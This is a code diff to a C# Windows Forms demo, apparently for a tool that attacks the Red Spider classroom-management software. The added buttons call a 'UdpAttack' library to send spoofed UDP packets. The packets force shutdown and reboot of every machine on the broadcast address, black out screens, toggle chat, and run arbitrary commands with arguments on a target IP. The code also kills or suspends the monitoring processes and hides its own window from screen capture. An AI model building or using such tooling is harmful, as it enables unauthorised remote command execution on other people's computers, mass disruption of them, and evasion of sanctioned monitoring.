@@ -2,13 +2,17 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Net;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using T4CLLibrary;
 using T4CLLibrary.Mythware;
 
 namespace DemoGUI
@@ -418,24 +422,33 @@ namespace DemoGUI
             //    ShowError(ex.Message);
             //}
 
+            //try
+            //{
+            //    var openFileDialog = new OpenFileDialog();
+            //    if (openFileDialog.ShowDialog() == DialogResult.OK)
+            //    {
+            //        var filePath = openFileDialog.FileName;
+            //        var fileName = Path.GetFileName(filePath);
+            //        var fileBytes = File.ReadAllBytes(filePath);
+            //        T4CLLibrary.Mythware.UdpAttack.SendFile(fileName, fileBytes, textBoxIP.Text, int.Parse(textBoxPort.Text));
+            //        ShowInfo($"发送文件: {fileName} 到 {textBoxIP.Text}:{textBoxPort.Text}");
+            //    }
+            //}
+            //catch (Exception ex)
+            //{
+            //    ShowError($"发送文件失败: {ex.Message}");
+            //}
             try
             {
-                var openFileDialog = new OpenFileDialog();
-                if (openFileDialog.ShowDialog() == DialogResult.OK)
-                {
-                    var filePath = openFileDialog.FileName;
-                    var fileName = Path.GetFileName(filePath);
-                    var fileBytes = File.ReadAllBytes(filePath);
-                    T4CLLibrary.Mythware.UdpAttack.SendFile(fileName, fileBytes, textBoxIP.Text, int.Parse(textBoxPort.Text));
-                    ShowInfo($"发送文件: {fileName} 到 {textBoxIP.Text}:{textBoxPort.Text}");
-                }
+                T4CLLibrary.RedSpider.UdpAttack.SendShutdownPacket("255.255.255.255", force: true);
+                ShowInfo("发送成功");
+                T4CLLibrary.RedSpider.UdpAttack.SendRebootPacket("255.255.255.255", force: true);
+                ShowInfo("发送成功");
             }
             catch (Exception ex)
             {
-                ShowError($"发送文件失败: {ex.Message}");
+                ShowError("错误: " + ex.Message);
             }
-
-
 
         }
 
@@ -512,6 +525,139 @@ namespace DemoGUI
             else if (e.Button == MouseButtons.Right)
             {
                 
+            }
+        }
+
+        private void Form1_Shown(object sender, EventArgs e)
+        {
+            this.SetDisplayAffinity(DisplayAffinity.Transparent);
+        }
+
+        private void buttonRSBlackScrn_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var ip = textBoxIP.Text;
+                int port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                T4CLLibrary.RedSpider.UdpAttack.SendBlackScreenPacket(ip,port);
+                ShowInfo($"已发送黑屏命令到 {ip}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送黑屏命令失败: {ex.Message}");
+            }
+        }
+
+        private void buttonRSUnblackScrn_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var ip = textBoxIP.Text;
+                int port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                T4CLLibrary.RedSpider.UdpAttack.SendBlackScreenPacket(ip, port,false);
+                ShowInfo($"已发送解除黑屏命令到 {ip}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送接触黑屏命令失败: {ex.Message}");
+            }
+        }
+
+        private void buttonRSCmd_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var path = textBoxRSFilePath.Text;
+                var args = textBoxRSArgs.Text;
+                var ip = textBoxIP.Text;
+                int port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                T4CLLibrary.RedSpider.UdpAttack.SendCommandPacket(path, args, ip, port);
+                ShowInfo($"已发送命令到 {ip}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送命令失败: {ex.Message}");
+            }
+        }
+
+        private void buttonKillRS_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                T4CLLibrary.RedSpider.ProcessManager.KillAllProcesses();
+                ShowInfo("红蜘蛛进程已结束");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"结束进程失败{ex.Message}");
+            }
+        }
+
+        private void buttonResumeRS_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                T4CLLibrary.RedSpider.ProcessManager.ResumeMainProcess();
+                ShowInfo("红蜘蛛主进程已恢复");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"恢复进程失败{ex.Message}");
+            }
+        }
+
+        private void buttonSuspendRS_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                T4CLLibrary.RedSpider.ProcessManager.SuspendMainProcess();
+                ShowInfo("红蜘蛛主进程已挂起");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"挂起进程失败{ex.Message}");
+            }
+        }
+
+        private void buttonRSShutdown_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                T4CLLibrary.RedSpider.UdpAttack.SendShutdownPacket(textBoxIP.Text, port);
+                ShowInfo($"已发送关机命令到 {textBoxIP.Text}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送关机命令失败: {ex.Message}");
+            }
+        }
+
+        private void buttonRSAllowChat_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                T4CLLibrary.RedSpider.UdpAttack.SendAllowChatPacket(textBoxIP.Text, port, true);
+                ShowInfo($"已发送允许聊天数据到 {textBoxIP.Text}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送允许聊天数据失败: {ex.Message}");
+            }
+        }
+
+        private void buttonRSDisallowChat_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                T4CLLibrary.RedSpider.UdpAttack.SendAllowChatPacket(textBoxIP.Text, port, false);
+                ShowInfo($"已发送禁止聊天数据到 {textBoxIP.Text}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送禁止聊天数据失败: {ex.Message}");
             }
         }
     }
